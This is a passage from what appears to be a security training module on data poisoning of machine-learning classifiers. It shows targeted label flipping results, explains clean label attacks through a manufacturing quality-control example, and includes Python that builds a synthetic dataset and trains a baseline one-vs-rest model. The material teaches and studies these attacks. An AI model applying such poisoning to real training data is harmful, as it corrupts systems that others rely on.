        [<span class="hljs-number">0</span>],
        marker=<span class="hljs-string">"o"</span>,
        <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
        <span class="hljs-built_in">label</span>=f<span class="hljs-string">"Predicted as Class 1 (Yellow)"</span>,
        markersize=<span class="hljs-number">10</span>,
        markerfacecolor=nugget_yellow,
        linestyle=<span class="hljs-string">"None"</span>,
    ),
    *(
        [
            plt.Line2D(
                [<span class="hljs-number">0</span>],
                [<span class="hljs-number">0</span>],
                marker=<span class="hljs-string">"X"</span>,
                <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
                <span class="hljs-built_in">label</span>=f<span class="hljs-string">"Misclassified (True Class {target_class_to_flip})"</span>,
                markersize=<span class="hljs-number">12</span>,
                markeredgecolor=malware_red,
                markerfacecolor=<span class="hljs-string">"none"</span>,
                linestyle=<span class="hljs-string">"None"</span>,
            )
        ]
        <span class="hljs-keyword">if</span> n_misclassified_target &gt; <span class="hljs-number">0</span>
        <span class="hljs-keyword">else</span> []
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        <span class="hljs-built_in">color</span>=malware_red,
        lw=<span class="hljs-number">2.5</span>,
        linestyle=<span class="hljs-string">"dashed"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Decision Boundary (Targeted Model)"</span>,
    ),
]
plt.<span class="hljs-built_in">legend</span>(handles=handles, <span class="hljs-built_in">title</span>=<span class="hljs-string">"Predictions, Errors &amp; Boundary"</span>)
plt.<span class="hljs-built_in">grid</span>(True, <span class="hljs-built_in">color</span>=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, <span class="hljs-built_in">linewidth</span>=<span class="hljs-number">0.5</span>, alpha=<span class="hljs-number">0.3</span>)

# Set plot limits
plt.xlim(xx.<span class="hljs-built_in">min</span>(), xx.<span class="hljs-built_in">max</span>())
plt.ylim(yy.<span class="hljs-built_in">min</span>(), yy.<span class="hljs-built_in">max</span>())

# Apply theme to <span class="hljs-built_in">background</span>
fig = plt.gcf()
fig.set_facecolor(node_black)
ax = plt.gca()
ax.set_facecolor(node_black)

plt.<span class="hljs-built_in">show</span>()
</code></pre>
<p>This visualization shows the <code>targeted_poisoned_model</code>&#39;s predictions and its decision boundary applied to the unseen data.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/targeted_flip_unseen_predictions.png" alt="targeted\_flip\_unseen\_predictions.png"></p>
<p>The points marked with a red &#39;X&#39; represent true <code>Class 1</code> instances that the poisoned model incorrectly predicts as <code>Class 0</code>. These misclassifications primarily occur within the actual <code>Class 1</code> cluster but fall on the <code>Class 0</code> side of the shifted decision boundary (dashed red line).</p>
<p>This clearly demonstrates how the boundary shift induced by the targeted attack successfully causes the intended misclassifications on new, unseen data.</p>
<hr>
<h2 id="clean-label-attacks">Clean Label Attacks</h2>
<hr>
<p>So far, we have explored data poisoning attacks like <code>Label Flipping</code> and <code>Targeted Label Flipping</code>. Both of these methods directly manipulated the <code>ground truth labels</code> associated with training data instances. We now explore another category of data poisoning attacks: the <code>Clean Label Attack</code>.</p>
<p>A defining characteristic of <code>Clean Label Attacks</code> compared to the label attacks, is that <code>they do not alter the ground truth labels of the training data</code>. Instead, an adversary carefully <code>modifies the features</code> of one or more training instances. These modifications are crafted such that the original assigned label remains plausible (or technically correct) for the modified features. The goal is typically highly targeted: to cause the model trained on this poisoned data to misclassify specific, pre-determined <code>target instances</code> during inference. This happens even though the poisoned training data itself might appear relatively normal, with labels that seem consistent with the (perturbed) features.</p>
<p>Let&#39;s consider a manufacturing quality control scenario. Imagine a system using measurements like <code>component length</code> and <code>component weight</code> (the features) to automatically classify manufactured parts into three categories: <code>Major Defect</code> (Class 0), <code>Acceptable</code> (Class 1), or <code>Minor Defect</code> (Class 2). Suppose an adversary wants a specific batch of <code>Acceptable</code> parts (<code>target instance</code>, true label 1) to be rejected by being classified as having a Major Defect.</p>
<p>Using a <code>Clean Label Attack</code>, an adversary could take several training data examples originally labeled as <code>Major Defect</code>. They would then subtly alter the recorded <code>length</code> and <code>weight</code> features of these specific <code>Major Defect</code> examples. The perturbations would be designed to shift the feature representation of these parts closer to the region typically occupied by <code>Acceptable</code> parts in the feature space. However, these perturbed samples retain their original <code>Major Defect</code> designation within the poisoned training dataset.</p>
<p>When the quality control model is retrained on this manipulated data, it encounters data points labeled <code>Major Defect</code> that are situated closer to, or even within, the feature space region associated with <code>Acceptable</code> parts. To correctly classify these perturbed points according to their given <code>Major Defect</code> label while minimizing training error, the model is forced to adjust its learned <code>decision boundary</code> between Class 0 and Class 1. This induced adjustment could shift the boundary sufficiently to encompass the chosen <code>target instance</code> (the truly <code>Acceptable</code> batch), causing it to be misclassified as <code>Major Defect</code>. The attack succeeds without ever directly changing any labels in the training data, only modifying feature values subtly.</p>
<h3 id="the-dataset">The Dataset</h3>
<p>To demonstrate this, we will create a synthetic dataset consisting of three classes, suitable for our quality control scenario. We will generate the data using the same <code>make_blobs</code> function.</p>
<p>Each instance 𝐱i=(xi1,xi2) will represent a part with two features (e.g., conceptual <code>length</code> and <code>weight</code>), and the corresponding label yi will belong to one of three classes: {0,1,2} (representing <code>Major Defect</code>, <code>Acceptable</code>, <code>Minor Defect</code>). We will also apply feature scaling to normalize the dataset.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-built_in">import</span> numpy as np
<span class="hljs-built_in">import</span> matplotlib.pyplot as plt
from sklearn.datasets <span class="hljs-built_in">import</span> make_blobs
from sklearn.model_selection <span class="hljs-built_in">import</span> train_test_split
from sklearn.linear_model <span class="hljs-built_in">import</span> LogisticRegression
from sklearn.metrics <span class="hljs-built_in">import</span> accuracy_score, classification_report, confusion_matrix
from sklearn.preprocessing <span class="hljs-built_in">import</span> StandardScaler
from sklearn.neighbors <span class="hljs-built_in">import</span> NearestNeighbors
from sklearn.multiclass <span class="hljs-built_in">import</span> OneVsRestClassifier
<span class="hljs-built_in">import</span> seaborn as sns

<span class="hljs-comment"># Color palette</span>
<span class="hljs-attr">htb_green</span> = <span class="hljs-string">"#9fef00"</span>
<span class="hljs-attr">node_black</span> = <span class="hljs-string">"#141d2b"</span>
<span class="hljs-attr">hacker_grey</span> = <span class="hljs-string">"#a4b1cd"</span>
<span class="hljs-attr">white</span> = <span class="hljs-string">"#ffffff"</span>
<span class="hljs-attr">azure</span> = <span class="hljs-string">"#0086ff"</span>       <span class="hljs-comment"># Class 0</span>
<span class="hljs-attr">nugget_yellow</span> = <span class="hljs-string">"#ffaf00"</span> <span class="hljs-comment"># Class 1</span>
<span class="hljs-attr">malware_red</span> = <span class="hljs-string">"#ff3e3e"</span>    <span class="hljs-comment"># Class 2</span>
<span class="hljs-attr">vivid_purple</span> = <span class="hljs-string">"#9f00ff"</span>   <span class="hljs-comment"># Highlight/Accent</span>
<span class="hljs-attr">aquamarine</span> = <span class="hljs-string">"#2ee7b6"</span>   <span class="hljs-comment"># Highlight/Accent</span>

<span class="hljs-comment"># Configure plot styles</span>
plt.style.use(<span class="hljs-string">"seaborn-v0_8-darkgrid"</span>)
plt.rcParams.update(
    {
        <span class="hljs-string">"figure.facecolor"</span>: node_black,
        <span class="hljs-string">"axes.facecolor"</span>: node_black,
        <span class="hljs-string">"axes.edgecolor"</span>: hacker_grey,
        <span class="hljs-string">"axes.labelcolor"</span>: white,
        <span class="hljs-string">"text.color"</span>: white,
        <span class="hljs-string">"xtick.color"</span>: hacker_grey,
        <span class="hljs-string">"ytick.color"</span>: hacker_grey,
        <span class="hljs-string">"grid.color"</span>: hacker_grey,
        <span class="hljs-string">"grid.alpha"</span>: <span class="hljs-number">0.1</span>,
        <span class="hljs-string">"legend.facecolor"</span>: node_black,
        <span class="hljs-string">"legend.edgecolor"</span>: hacker_grey,
        <span class="hljs-string">"legend.frameon"</span>: True,
        <span class="hljs-string">"legend.framealpha"</span>: <span class="hljs-number">0.8</span>, <span class="hljs-comment"># Slightly transparent legend background</span>
        <span class="hljs-string">"legend.labelcolor"</span>: white,
        <span class="hljs-string">"figure.figsize"</span>: (<span class="hljs-number">12</span>, <span class="hljs-number">7</span>), <span class="hljs-comment"># Default figure size</span>
    }
)

<span class="hljs-comment"># Seed for reproducibility - MUST BE 1337</span>
<span class="hljs-attr">SEED</span> = <span class="hljs-number">1337</span>
np.random.seed(SEED)

print(<span class="hljs-string">"Setup complete. Libraries imported and styles configured."</span>)

<span class="hljs-comment"># Generate 3-class synthetic data</span>
<span class="hljs-attr">n_samples</span> = <span class="hljs-number">1500</span>
<span class="hljs-attr">centers_3class</span> = [(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">8</span>, <span class="hljs-number">6</span>)]  <span class="hljs-comment"># Centers for three blobs</span>
X_3c, <span class="hljs-attr">y_3c</span> = make_blobs(
    <span class="hljs-attr">n_samples=n_samples,</span>
    <span class="hljs-attr">centers=centers_3class,</span>
    <span class="hljs-attr">n_features=2,</span>
    <span class="hljs-attr">cluster_std=1.15,</span> <span class="hljs-comment"># Standard deviation of clusters</span>
    <span class="hljs-attr">random_state=SEED,</span>
)

<span class="hljs-comment"># Standardize features</span>
<span class="hljs-attr">scaler</span> = StandardScaler()
<span class="hljs-attr">X_3c_scaled</span> = scaler.fit_transform(X_3c)

<span class="hljs-comment"># Split data into training and testing sets, stratifying by class</span>
X_train_3c, X_test_3c, y_train_3c, <span class="hljs-attr">y_test_3c</span> = train_test_split(
    X_3c_scaled, y_3c, <span class="hljs-attr">test_size=0.3,</span> <span class="hljs-attr">random_state=SEED,</span> <span class="hljs-attr">stratify=y_3c</span>
)

print(f<span class="hljs-string">"\nGenerated {n_samples} samples with 3 classes."</span>)
print(f<span class="hljs-string">"Training set size: {X_train_3c.shape[0]} samples."</span>)
print(f<span class="hljs-string">"Testing set size: {X_test_3c.shape[0]} samples."</span>)
print(f<span class="hljs-string">"Classes: {np.unique(y_3c)}"</span>)
print(f<span class="hljs-string">"Feature shape: {X_train_3c.shape}"</span>)
</code></pre>
<p>Running the code cell above generates our three-class dataset, standardizes the features, and splits it into training and testing sets. The output confirms the size and class distribution.</p>
<p>Code: python</p>
<pre><code class="lang-python">Setup complete. Libraries imported and styles configured.

Generated 1500 samples with 3 classes.
Training set size: 1050 samples.
<span class="hljs-keyword">Testing </span>set size: 450 samples.
Classes: [0 1 2]
Feature shape: (1050, 2)
</code></pre>
<p>Visualizing the clean training data is the best way to understand the initial separation between the classes before any attack occurs. We will adapt our plotting function to handle multiple classes and allow for highlighting specific points, which will be useful later for identifying the target and perturbed points.</p>
<p>Code: python</p>
<pre><code class="lang-python">def plot_data_multi(
    X,
    y,
    title=<span class="hljs-string">"Multi-Class Dataset Visualization"</span>,
    highlight_indices=None,
    highlight_markers=None,
    highlight_colors=None,
    highlight_labels=None,
):
    <span class="hljs-string">""</span>"
    Plots a 2D multi-<span class="hljs-keyword">class</span> dataset with <span class="hljs-keyword">class</span>-specific colors and optional highlighting.
    Automatically ensures points marked with 'P' are plotted above all others.

    <span class="hljs-keyword">Args</span>:
        X (np.ndarray): Feature data (n_samples, 2).
        y (np.ndarray): Labels (n_samples,).
        title (str): The title <span class="hljs-keyword">for</span> the <span class="hljs-keyword">plot</span>.
        highlight_indices (<span class="hljs-keyword">list</span> | np.ndarray, optional): Indices of points <span class="hljs-keyword">in</span> X to highlight. Defaults to None.
        highlight_markers (<span class="hljs-keyword">list</span>, optional): Markers <span class="hljs-keyword">for</span> highlighted points (recycled <span class="hljs-keyword">if</span> shorter).
                                          Points with marker 'P' will be plotted <span class="hljs-keyword">on</span> top. Defaults to ['o'].
        highlight_colors (<span class="hljs-keyword">list</span>, optional): Edge colors <span class="hljs-keyword">for</span> highlighted points (recycled). Defaults to [vivid_purple].
        highlight_labels (<span class="hljs-keyword">list</span>, optional): Labels <span class="hljs-keyword">for</span> highlighted points legend (recycled). Defaults to [''].
    <span class="hljs-string">""</span>"
    plt.figure(figsize=(12, 7))
    # Define colors based <span class="hljs-keyword">on</span> the <span class="hljs-keyword">global</span> <span class="hljs-keyword">palette</span> <span class="hljs-keyword">for</span> classes 0, 1, 2 (or <span class="hljs-keyword">more</span> <span class="hljs-keyword">if</span> needed)
    class_colors = [
        azure,
        nugget_yellow,
        malware_red,
    ]  # Extend <span class="hljs-keyword">if</span> you have <span class="hljs-keyword">more</span> than 3 classes
    unique_classes = np.unique(y)
    max_class_idx = np.<span class="hljs-built_in">max</span>(unique_classes) <span class="hljs-keyword">if</span> len(unique_classes) &gt; 0 <span class="hljs-keyword">else</span> -1
    <span class="hljs-keyword">if</span> max_class_idx &gt;= len(class_colors):
        <span class="hljs-keyword">print</span>(
            f<span class="hljs-string">"{malware_red}Warning:{white} More classes ({max_class_idx + 1}) than defined colors ({len(class_colors)}). Using fallback color."</span>
        )
        class_colors.extend([hacker_grey] * (max_class_idx + 1 - len(class_colors)))

    cmap_multi = plt.cm.colors.ListedColormap(class_colors)

    # <span class="hljs-keyword">Plot</span> all non-highlighted points first
    plt.<span class="hljs-keyword">scatter</span>(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=cmap_multi,
        edgecolors=node_black,
        s=50,
        <span class="hljs-keyword">alpha</span>=0.7,
        zorder=1,  # Base layer
    )

    # <span class="hljs-keyword">Plot</span> highlighted points <span class="hljs-keyword">on</span> top <span class="hljs-keyword">if</span> specified
    highlight_handles = []
    <span class="hljs-keyword">if</span> highlight_indices is not None and len(highlight_indices) &gt; 0:
        num_highlights = len(highlight_indices)
        # Provide defaults <span class="hljs-keyword">if</span> None
        _highlight_markers = (
            highlight_markers
            <span class="hljs-keyword">if</span> highlight_markers is not None
            <span class="hljs-keyword">else</span> [<span class="hljs-string">"o"</span>] * num_highlights
        )
        _highlight_colors = (
            highlight_colors
            <span class="hljs-keyword">if</span> highlight_colors is not None
            <span class="hljs-keyword">else</span> [vivid_purple] * num_highlights
        )
        _highlight_labels = (
            highlight_labels <span class="hljs-keyword">if</span> highlight_labels is not None <span class="hljs-keyword">else</span> [<span class="hljs-string">""</span>] * num_highlights
        )

        <span class="hljs-keyword">for</span> i, idx <span class="hljs-keyword">in</span> enumerate(highlight_indices):
            <span class="hljs-keyword">if</span> not (0 &lt;= idx &lt; X.shape[0]):
                <span class="hljs-keyword">print</span>(
                    f<span class="hljs-string">"{malware_red}Warning:{white} Invalid highlight index {idx} skipped."</span>
                )
                <span class="hljs-keyword">continue</span>

            # Determine marker, edge color, and <span class="hljs-keyword">label</span> <span class="hljs-keyword">for</span> this point
            marker = _highlight_markers[i % len(_highlight_markers)]
            edge_color = _highlight_colors[i % len(_highlight_colors)]
            <span class="hljs-keyword">label</span> = _highlight_labels[i % len(_highlight_labels)]

            # Determine face color based <span class="hljs-keyword">on</span> the point's true <span class="hljs-keyword">class</span>
            point_class = y[idx]
            try:
                face_color = class_colors[int(point_class)]
            except (IndexError, TypeError):
                <span class="hljs-keyword">print</span>(
                    f<span class="hljs-string">"{malware_red}Warning:{white} Class index '{point_class}' invalid. Using fallback."</span>
                )
                face_color = hacker_grey

            current_zorder = (
                3 <span class="hljs-keyword">if</span> marker == <span class="hljs-string">"P"</span> <span class="hljs-keyword">else</span> 2
            )  # <span class="hljs-keyword">If</span> marker is 'P', <span class="hljs-keyword">use</span> zorder 3, <span class="hljs-keyword">else</span> 2

            # <span class="hljs-keyword">Plot</span> the highlighted point
            plt.<span class="hljs-keyword">scatter</span>(
                X[idx, 0],
                X[idx, 1],
                facecolors=face_color,
                edgecolors=edge_color,
                marker=marker,  # <span class="hljs-keyword">Use</span> the determined marker
                s=180,
                linewidths=2,
                <span class="hljs-keyword">alpha</span>=1.0,
                zorder=current_zorder,  # <span class="hljs-keyword">Use</span> the zorder determined <span class="hljs-keyword">by</span> the marker
            )
            # Create legend handle <span class="hljs-keyword">if</span> <span class="hljs-keyword">label</span> exists
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">label</span>:
                highlight_handles.<span class="hljs-keyword">append</span>(
                    plt.Line2D(
                        [0],
                        [0],
                        marker=marker,
                        color=<span class="hljs-string">"w"</span>,
                        <span class="hljs-keyword">label</span>=<span class="hljs-keyword">label</span>,
                        markerfacecolor=face_color,
                        markeredgecolor=edge_color,
                        markersize=10,
                        linestyle=<span class="hljs-string">"None"</span>,
                        markeredgewidth=1.5,
                    )
                )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel(<span class="hljs-string">"Feature 1 (Standardized)"</span>, fontsize=12)
    plt.ylabel(<span class="hljs-string">"Feature 2 (Standardized)"</span>, fontsize=12)

    # Create <span class="hljs-keyword">class</span> legend handles
    class_handles = []
    unique_classes_present = sorted(np.unique(y))
    <span class="hljs-keyword">for</span> class_idx <span class="hljs-keyword">in</span> unique_classes_present:
        try:
            int_class_idx = int(class_idx)
            class_handles.<span class="hljs-keyword">append</span>(
                plt.Line2D(
                    [0],
                    [0],
                    marker=<span class="hljs-string">"o"</span>,
                    color=<span class="hljs-string">"w"</span>,
                    <span class="hljs-keyword">label</span>=f<span class="hljs-string">"Class {int_class_idx}"</span>,
                    markersize=10,
                    markerfacecolor=class_colors[int_class_idx],
                    markeredgecolor=node_black,
                    linestyle=<span class="hljs-string">"None"</span>,
                )
            )
        except (IndexError, TypeError):
            <span class="hljs-keyword">print</span>(
                f<span class="hljs-string">"{malware_red}Warning:{white} Cannot create legend entry for class {class_idx}."</span>
            )

    # Combine legends
    all_handles = class_handles + highlight_handles
    <span class="hljs-keyword">if</span> all_handles:
        plt.legend(handles=all_handles, title=<span class="hljs-string">"Classes &amp; Points"</span>)

    plt.grid(True, color=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, linewidth=0.5, <span class="hljs-keyword">alpha</span>=0.3)
    plt.show()


# <span class="hljs-keyword">Plot</span> the initial clean training data
<span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Visualizing Clean Training Data ---"</span>)
plot_data_multi(X_train_3c, y_train_3c, title=<span class="hljs-string">"Original Training Data (3 Classes)"</span>)
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/302/feature_clean_data.png" alt="feature\_clean\_data.png"></p>
<p>The resulting plot displays our three classes (<code>Class 0: Azure</code>, <code>Class 1: Yellow</code>, <code>Class 2: Red</code>) distributed in the 2D standardized feature space. The clusters are reasonably well-separated, which will allow us to observe the effects of the attack more clearly.</p>
<hr>
<h2 id="baseline-one-vs-rest-logistic-regression-model">Baseline One-vs-Rest Logistic Regression Model</h2>
<hr>
<p>Before attempting the <code>Clean Label Attack</code>, we need a reference point. We will establish <code>baseline performance</code> by training a model on the clean, original training data (<code>X_train_3c</code>, <code>y_train_3c</code>). This baseline shows the model&#39;s accuracy and the initial positions of its <code>decision boundaries</code> under normal conditions.</p>
<p>Since we have three classes, standard <code>Logistic Regression</code>, which is inherently binary, needs adaptation. A common approach is the <code>One-vs-Rest</code> (<code>OvR</code>) strategy, also known as <code>One-vs-All</code>. Scikit-learn provides the <code>OneVsRestClassifier</code> wrapper for this purpose.</p>
<p>In the <code>OvR</code> strategy for a problem with K classes (here, K=3), we train K independent binary logistic regression models. The k-th model (k∈{0,1,...,K−1}) is trained to distinguish samples belonging to class k (considered the &quot;positive&quot; class for this model) from samples belonging to <code>any of the other</code> K−1 classes (all lumped together as the &quot;negative&quot; class).</p>
<p>Each binary model k learns its own weight vector 𝐰k and intercept (bias) bk. The decision function for the k-th model computes a score, often related to the signed distance from its separating hyperplane or the log-odds of belonging to class k. For a standard logistic regression core, this score is the linear combination:</p>
<p>zk=𝐰kT𝐱+bk</p>
<p>This zk value essentially represents the confidence of the k-th binary classifier that the input 𝐱 belongs to class k versus all other classes.</p>
<p>To make a final prediction for a new input 𝐱, the <code>OvR</code> strategy computes these scores z0,z1,...,zK−1 from all K binary models. The class assigned to 𝐱 is the one corresponding to the model that produces the highest score:</p>
<p>ŷ=arg max⁡k∈{0,…,K−1}zk=arg max⁡k∈{0,…,K−1}(𝐰k𝖳𝐱+bk)</p>
<p>The <code>decision boundary</code> separating any two classes, say class i and class j, is the set of points 𝐱 where the scores assigned by their respective binary models are equal: zi=zj. This equality defines a linear boundary (a line in our 2D case, a hyperplane in higher dimensions):</p>
<p>𝐰iT𝐱+bi=𝐰jT𝐱+bj</p>
<p>Rearranging this gives the equation of the separating hyperplane:</p>
<p>(𝐰i−𝐰j)T𝐱+(bi−bj)=0</p>
<p>The overall effect is that the <code>OvR</code> classifier partitions the feature space into K decision regions, separated by these piecewise linear boundaries.</p>
<p>Let&#39;s train this baseline <code>OvR</code> model using <code>Logistic Regression</code> as the base estimator.</p>
<p>Code: python</p>
<pre><code class="lang-python">print(<span class="hljs-string">"\n--- Training Baseline Model ---"</span>)
<span class="hljs-comment"># Initialize the base estimator</span>
<span class="hljs-comment"># Using 'liblinear' solver as it's good for smaller datasets and handles OvR well.</span>
<span class="hljs-comment"># C=1.0 is the default inverse regularization strength.</span>
<span class="hljs-attr">base_estimator</span> = LogisticRegression(<span class="hljs-attr">random_state=SEED,</span> <span class="hljs-attr">C=1.0,</span> <span class="hljs-attr">solver="liblinear")</span>

<span class="hljs-comment"># Initialize the OneVsRestClassifier wrapper using the base estimator</span>
<span class="hljs-attr">baseline_model_3c</span> = OneVsRestClassifier(base_estimator)

<span class="hljs-comment"># Train the OvR model on the clean training data</span>
baseline_model_3c.fit(X_train_3c, y_train_3c)
print(<span class="hljs-string">"Baseline OvR model trained successfully."</span>)

<span class="hljs-comment"># Predict on the clean test set to evaluate baseline performance</span>
<span class="hljs-attr">y_pred_baseline_3c</span> = baseline_model_3c.predict(X_test_3c)

<span class="hljs-comment"># Calculate baseline accuracy</span>
<span class="hljs-attr">baseline_accuracy_3c</span> = accuracy_score(y_test_3c, y_pred_baseline_3c)
print(f<span class="hljs-string">"Baseline 3-Class Model Accuracy on Test Set: {baseline_accuracy_3c:.4f}"</span>)

<span class="hljs-comment"># Prepare meshgrid for plotting decision boundaries</span>
<span class="hljs-comment"># We create a grid of points covering the feature space</span>
<span class="hljs-attr">h</span> = <span class="hljs-number">0.02</span>  <span class="hljs-comment"># Step size in the mesh</span>
x_min, <span class="hljs-attr">x_max</span> = X_train_3c[:, <span class="hljs-number">0</span>].min() - <span class="hljs-number">1</span>, X_train_3c[:, <span class="hljs-number">0</span>].max() + <span class="hljs-number">1</span>
y_min, <span class="hljs-attr">y_max</span> = X_train_3c[:, <span class="hljs-number">1</span>].min() - <span class="hljs-number">1</span>, X_train_3c[:, <span class="hljs-number">1</span>].max() + <span class="hljs-number">1</span>
xx_3c, <span class="hljs-attr">yy_3c</span> = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))
<span class="hljs-comment"># Combine xx and yy into pairs of coordinates for prediction</span>
<span class="hljs-attr">mesh_points_3c</span> = np.c_[xx_3c.ravel(), yy_3c.ravel()]

<span class="hljs-comment"># Predict classes for each point on the meshgrid using the trained baseline model</span>
<span class="hljs-attr">Z_baseline_3c</span> = baseline_model_3c.predict(mesh_points_3c)
<span class="hljs-comment"># Reshape the predictions back into the grid shape for contour plotting</span>
<span class="hljs-attr">Z_baseline_3c</span> = Z_baseline_3c.reshape(xx_3c.shape)
print(<span class="hljs-string">"Meshgrid predictions generated for baseline model."</span>)

<span class="hljs-comment"># Extract baseline model parameters (weights w_k and intercepts b_k)</span>
<span class="hljs-comment"># The fitted OvR classifier stores its individual binary estimators in the `estimators_` attribute</span>
try:
    <span class="hljs-keyword">if</span> (
        hasattr(baseline_model_3c, <span class="hljs-string">"estimators_"</span>)
        <span class="hljs-literal">and</span> len(baseline_model_3c.estimators_) == <span class="hljs-number">3</span>
    ):
        <span class="hljs-attr">estimators_base</span> = baseline_model_3c.estimators_
        <span class="hljs-comment"># For binary LogisticRegression with liblinear, coef_ is shape (1, n_features) and intercept_ is (1,)</span>
        <span class="hljs-comment"># We extract them for each of the 3 binary classifiers (0 vs Rest, 1 vs Rest, 2 vs Rest)</span>
        <span class="hljs-attr">w0_base</span> = estimators_base[<span class="hljs-number">0</span>].coef_[<span class="hljs-number">0</span>]  <span class="hljs-comment"># Weight vector for class 0 vs Rest</span>
        <span class="hljs-attr">b0_base</span> = estimators_base[<span class="hljs-number">0</span>].intercept_[<span class="hljs-number">0</span>]  <span class="hljs-comment"># Intercept for class 0 vs Rest</span>
        <span class="hljs-attr">w1_base</span> = estimators_base[<span class="hljs-number">1</span>].coef_[<span class="hljs-number">0</span>]  <span class="hljs-comment"># Weight vector for class 1 vs Rest</span>
        <span class="hljs-attr">b1_base</span> = estimators_base[<span class="hljs-number">1</span>].intercept_[<span class="hljs-number">0</span>]  <span class="hljs-comment"># Intercept for class 1 vs Rest</span>
        <span class="hljs-attr">w2_base</span> = estimators_base[<span class="hljs-number">2</span>].coef_[<span class="hljs-number">0</span>]  <span class="hljs-comment"># Weight vector for class 2 vs Rest</span>
        <span class="hljs-attr">b2_base</span> = estimators_base[<span class="hljs-number">2</span>].intercept_[<span class="hljs-number">0</span>]  <span class="hljs-comment"># Intercept for class 2 vs Rest</span>
        print(
            <span class="hljs-string">"Baseline model parameters (w0, b0, w1, b1, w2, b2) extracted successfully."</span>
        )
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># This might happen if the model didn't fit correctly or classes were dropped</span>
        raise RuntimeError(
            <span class="hljs-string">"Could not extract expected number of estimators from baseline OvR model."</span>
        )
except Exception as e:
    print(f<span class="hljs-string">"Error: Failed to extract baseline parameters: {e}"</span>)
</code></pre>
<p>Now we define a function to visualize these multi-class decision boundaries and plot the baseline result.</p>
<p>Code: python</p>
<pre><code class="lang-python">def plot_decision_boundary_multi(
    X,
    y,
    Z_mesh,
    xx_mesh,
    yy_mesh,
    title=<span class="hljs-string">"Decision Boundary"</span>,
    highlight_indices=None,
    highlight_markers=None,
    highlight_colors=None,
    highlight_labels=None,
):
    <span class="hljs-string">""</span>"
    Plots the decision boundary regions and data points <span class="hljs-keyword">for</span> a multi-<span class="hljs-keyword">class</span> classifier.
    Automatically ensures points marked with 'P' are plotted above other points.
    Explicit boundary lines are masked to only show <span class="hljs-keyword">in</span> relevant background regions.

    <span class="hljs-keyword">Args</span>:
        X (np.ndarray): Feature data <span class="hljs-keyword">for</span> <span class="hljs-keyword">scatter</span> <span class="hljs-keyword">plot</span> (n_samples, 2).
        y (np.ndarray): Labels <span class="hljs-keyword">for</span> <span class="hljs-keyword">scatter</span> <span class="hljs-keyword">plot</span> (n_samples,).
        Z_mesh (np.ndarray): Predicted classes <span class="hljs-keyword">on</span> the meshgrid (shape matching xx_mesh).
        xx_mesh (np.ndarray): Meshgrid x-coordinates.
        yy_mesh (np.ndarray): Meshgrid y-coordinates.
        title (str): <span class="hljs-keyword">Plot</span> title.
        highlight_indices (<span class="hljs-keyword">list</span> | np.ndarray, optional): Indices of points <span class="hljs-keyword">in</span> X to highlight.
        highlight_markers (<span class="hljs-keyword">list</span>, optional): Markers <span class="hljs-keyword">for</span> highlighted points.
                                          Points with marker 'P' will be plotted <span class="hljs-keyword">on</span> top.
        highlight_colors (<span class="hljs-keyword">list</span>, optional): Edge colors <span class="hljs-keyword">for</span> highlighted points.
        highlight_labels (<span class="hljs-keyword">list</span>, optional): Labels <span class="hljs-keyword">for</span> highlighted points legend.
        boundary_lines (dict, optional): Dict specifying boundary lines to <span class="hljs-keyword">plot</span>, <span class="hljs-keyword">e</span>.<span class="hljs-keyword">g</span>.,
            {'<span class="hljs-keyword">label</span>': {'coeffs': (w_diff_x, w_diff_y), 'intercept': b_diff, 'color': 'color', 'style': 'linestyle'}}
    <span class="hljs-string">""</span>"
    plt.figure(figsize=(12, 7))  # Consistent figure size

    # Define base <span class="hljs-keyword">class</span> colors and slightly transparent ones <span class="hljs-keyword">for</span> contour fill
    class_colors = [azure, nugget_yellow, malware_red]  # Extend <span class="hljs-keyword">if</span> <span class="hljs-keyword">more</span> classes <span class="hljs-keyword">as</span> needed
    # Add fallback colors <span class="hljs-keyword">if</span> needed based <span class="hljs-keyword">on</span> y and Z_mesh
    unique_classes_y = np.unique(y)
    max_class_idx_y = np.<span class="hljs-built_in">max</span>(unique_classes_y) <span class="hljs-keyword">if</span> len(unique_classes_y) &gt; 0 <span class="hljs-keyword">else</span> -1
    unique_classes_z = np.unique(Z_mesh)
    max_class_idx_z = np.<span class="hljs-built_in">max</span>(unique_classes_z) <span class="hljs-keyword">if</span> len(unique_classes_z) &gt; 0 <span class="hljs-keyword">else</span> -1
    max_class_idx = int(<span class="hljs-built_in">max</span>(max_class_idx_y, max_class_idx_z))  # Ensure integer <span class="hljs-keyword">type</span>

    <span class="hljs-keyword">if</span> max_class_idx &gt;= len(class_colors):
        <span class="hljs-keyword">print</span>(
            f<span class="hljs-string">"Warning: More classes ({max_class_idx + 1}) than defined colors ({len(class_colors)}). Using fallback grey."</span>
        )
        # Ensure enough colors exist <span class="hljs-keyword">for</span> indexing up to max_class_idx
        needed_colors = max_class_idx + 1
        current_colors = len(class_colors)
        <span class="hljs-keyword">if</span> current_colors &lt; needed_colors:
            class_colors.extend([hacker_grey] * (needed_colors - current_colors))

    # Appending '60' provides approx 37% <span class="hljs-keyword">alpha</span> <span class="hljs-keyword">in</span> hex RGBA <span class="hljs-keyword">for</span> contour map
    # Ensure colors used <span class="hljs-keyword">for</span> cmap match the number of classes exactly
    light_colors = [
        c + <span class="hljs-string">"60"</span> <span class="hljs-keyword">if</span> len(c) == 7 and c.startswith(<span class="hljs-string">"#"</span>) <span class="hljs-keyword">else</span> c
        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> class_colors[: max_class_idx + 1]
    ]
    cmap_light = plt.cm.colors.ListedColormap(light_colors)

    # <span class="hljs-keyword">Plot</span> the decision boundary contour fill
